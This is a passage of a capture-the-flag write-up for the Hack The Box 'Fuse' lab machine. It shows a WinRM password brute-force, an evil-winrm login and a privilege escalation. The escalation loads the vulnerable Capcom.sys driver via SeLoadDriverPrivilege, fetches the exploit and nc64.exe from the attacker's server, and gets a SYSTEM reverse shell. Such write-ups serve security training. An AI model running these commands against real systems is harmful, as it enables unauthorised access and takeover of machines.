+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\k</span>rbtgt:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\D</span>efaultAccount:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\s</span>vc-print:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\b</span>nielson:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\s</span>thompson:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\t</span>lavel:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\p</span>merton:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\s</span>vc-scan:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\b</span>hult:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\d</span>andrews:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\m</span>berbatov:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\a</span>stein:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> 10.10.10.193:5985 - LOGIN FAILED: WORKGROUP<span style="color:#ae81ff">\d</span>muir:$fab@s3Rv1ce$1 <span style="color:#f92672">(</span>Incorrect: <span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed
+msf5 auxiliary<span style="color:#f92672">(</span>scanner/winrm/winrm_login<span style="color:#f92672">)</span> &gt; show options
+
+Module options <span style="color:#f92672">(</span>auxiliary/scanner/winrm/winrm_login<span style="color:#f92672">)</span>:
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords <span style="color:#66d9ef">for</span> all users
+   BRUTEFORCE_SPEED  <span style="color:#ae81ff">5</span>                yes       How fast to bruteforce, from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span>
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   DOMAIN            WORKGROUP        yes       The domain to use <span style="color:#66d9ef">for</span> Windows authentification
+   PASSWORD          $fab@s3Rv1ce$1   no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   Proxies                            no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+   RHOSTS            fuse.htb         yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+   RPORT             <span style="color:#ae81ff">5985</span>             yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+   SSL               false            no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works <span style="color:#66d9ef">for</span> a host
+   THREADS           <span style="color:#ae81ff">1</span>                yes       The number of concurrent threads <span style="color:#f92672">(</span>max one per host<span style="color:#f92672">)</span>
+   URI               /wsman           yes       The URI of the WinRM service
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password <span style="color:#66d9ef">for</span> all users
+   USER_FILE         users_rpc.txt    no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output <span style="color:#66d9ef">for</span> all attempts
+   VHOST                              no        HTTP server virtual host
+</code></pre></div><p>SAD because nothing worked&hellip;</p>
+<h2 id="3---exploit">3 - Exploit</h2>
+<p>I was hitting the wall with my head and then I tried to manually use the user/password one by one&hellip;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">evil-winrm -u svc-print -p <span style="color:#e6db74">&#39;$fab@s3Rv1ce$1&#39;</span> -i fuse.htb
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-print<span style="color:#ae81ff">\D</span>esktop&gt;
+
+</code></pre></div><p>Ok, now worked after a long pain but I still don&rsquo;t know why the scanner did not work&hellip;maybe something was bad inside the Kali Linux version of <em>msf5 auxiliary(scanner/winrm/winrm_login)</em>.</p>
+<p>Who knows ?&hellip;User flag done.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-print<span style="color:#ae81ff">\D</span>esktop&gt; ls
+
+
+    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-print<span style="color:#ae81ff">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         8/5/2020  12:10 PM             <span style="color:#ae81ff">34</span> user.txt&lt;  
+
+
+a5dc<span style="color:#f92672">[</span>.....<span style="color:#f92672">]</span>e435
+</code></pre></div><h2 id="4---post-exploitation-and-privilege-scalation">4 - Post-Exploitation and privilege scalation</h2>
+<p>Ok, so now only root is remaining&hellip;</p>
+<p>After a well deserved break I started to enumerate more:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+<span style="color:#f92672">===================</span> <span style="color:#f92672">==============================================</span>
+fabricorp<span style="color:#ae81ff">\s</span>vc-print S-1-5-21-2633719317-1471316042-3957863514-1104
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+<span style="color:#f92672">==========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">==============================================</span> <span style="color:#f92672">==================================================</span>
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN<span style="color:#ae81ff">\P</span>rint Operators                    Alias            S-1-5-32-550                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN<span style="color:#ae81ff">\U</span>sers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+FABRICORP<span style="color:#ae81ff">\I</span>T_Accounts                      Group            S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label<span style="color:#ae81ff">\H</span>igh Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+<span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support <span style="color:#66d9ef">for</span> Dynamic Access Control on this device has been disabled.
+</code></pre></div><p>Something caught my attention&hellip;because a <em>generic</em> user like svc-print is strange to have the privilege to load drivers inside the system.</p>
+<p><em>SeLoadDriverPrivilege</em></p>
+<p>This privilege can be used to load evil drivers:</p>
+<p><a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/</a></p>
+<p>This time I used the driver <em>capcom</em></p>
+<p><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a></p>
+<p><a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">https://github.com/TarlogicSecurity/EoPLoadDriver/</a></p>
+<p><a href="https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom">https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom</a></p>
+<p>I manually edited and compiled the exploit with VisualStudio. The key is using the exploit to elevate privileges.</p>
+<p>then I used python to serve the exploit and files to the machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server <span style="color:#ae81ff">8002</span>
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8002</span> <span style="color:#f92672">(</span>http://0.0.0.0:8002/<span style="color:#f92672">)</span> ...
+</code></pre></div><p>I used this time C:/Windows/Temp to store the exploit, was tricky because I can write and execute but not read&hellip; Also tried to spawn a root shell with the exploit without success.
+In addition, this time the machine was unstable or something was bad because I could not use the exploit so&hellip; I wrote my custom script(.bat) to generate a reverse shell to my machine using a precompiled version of nc:</p>
+<p>Editing the line 292 of the <em>ExploitCapcom.cpp</em> to use my shiny bat:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">TCHAR CommandLine[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Temp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">launch.bat&#34;</span>); 
+</code></pre></div><p>The basic idea is to recover again the files to the path <em>C:\Windows\Temp</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Invoke-WebRequest 10.10.14.8:8002/Capcom.sys -UseBasicParsing -OutFile C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\C</span>apcom.sys
+Invoke-WebRequest 10.10.14.8:8002/EOPLOADDRIVER.exe -UseBasicParsing -OutFile C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\E</span>OPLOADDRIVER.exe
+Invoke-WebRequest 10.10.14.8:8002/ExploitCapcom.exe -UseBasicParsing -OutFile C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\E</span>xploitCapcom.exe
+Invoke-WebRequest 10.10.14.8:8002/nc64.exe -UseBasicParsing -OutFile C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\n</span>c64.exe
+</code></pre></div><p>and use the loader to generate the service:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WebRequest 10.10.14.8<span style="color:#960050;background-color:#1e0010">:</span>8002/Capcom.sys -UseBasicParsing -OutFile C:\Windows\Temp\Capcom.sys
+Invoke-WebRequest 10.10.14.8<span style="color:#960050;background-color:#1e0010">:</span>8002/EOPLOADDRIVER.exe -UseBasicParsing -OutFile C:\Windows\Temp\EOPLOADDRIVER.exe
+Invoke-WebRequest 10.10.14.8<span style="color:#960050;background-color:#1e0010">:</span>8002/ExploitCapcom.exe -UseBasicParsing -OutFile C:\Windows\Temp\ExploitCapcom.exe
+Invoke-WebRequest 10.10.14.8<span style="color:#960050;background-color:#1e0010">:</span>8002/nc64.exe -UseBasicParsing -OutFile C:\Windows\Temp\nc64.exe
+
+.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys
+.\ExploitCapcom.exe
+</code></pre></div><p>This time worked:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Windows\Temp&gt; ./downloader.ps1
+The <span style="color:#66d9ef">process</span> cannot access the file <span style="color:#e6db74">&#39;C:\Windows\Temp\Capcom.sys&#39;</span> because it is being used by another <span style="color:#66d9ef">process</span>.
+At C:\Windows\Temp\downloader.ps1<span style="color:#960050;background-color:#1e0010">:</span>1 char<span style="color:#960050;background-color:#1e0010">:</span>1
++ Invoke-WebRequest 10.10.14.8<span style="color:#960050;background-color:#1e0010">:</span>8002/Capcom.sys -UseBasicParsing -OutFil ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> NotSpecified<span style="color:#960050;background-color:#1e0010">:</span> (<span style="color:#960050;background-color:#1e0010">:</span>) [Invoke-WebRequest], IOException
+    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> System.IO.IOException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver<span style="color:#960050;background-color:#1e0010">:</span> \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
+NTSTATUS<span style="color:#960050;background-color:#1e0010">:</span> c000010e, WinError<span style="color:#960050;background-color:#1e0010">:</span> 0
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 000001DAE8910008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] The SYSTEM shell was launched
+[*] Press any key to exit this program
+</code></pre></div><p>And my nc listening just poped out with the root connection from fuse :P</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvp <span style="color:#ae81ff">1338</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1338</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.8<span style="color:#f92672">]</span> from fuse.htb <span style="color:#f92672">[</span>10.10.10.193<span style="color:#f92672">]</span> <span style="color:#ae81ff">49813</span>
+Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
+<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp&gt;whoami
+whoami
+nt authority<span style="color:#ae81ff">\s</span>ystem
+
+
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;type root.txt
+type root.txt
+bf184<span style="color:#f92672">[</span>.....<span style="color:#f92672">]</span>15d88c
+
+</code></pre></div><p>This machine was hard for me because I was not familiarized with the drivers permissions, so this time the enumeration and foothold was hard&hellip; but u know <em>sometimes</em> trying hard works.</p>
+<p>Thanks for reading!</p>
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
+    <div>© 2020 — u915 — <a href="/license/">License</a></div>
+  </div>
+</footer>
+</body>
+</html>
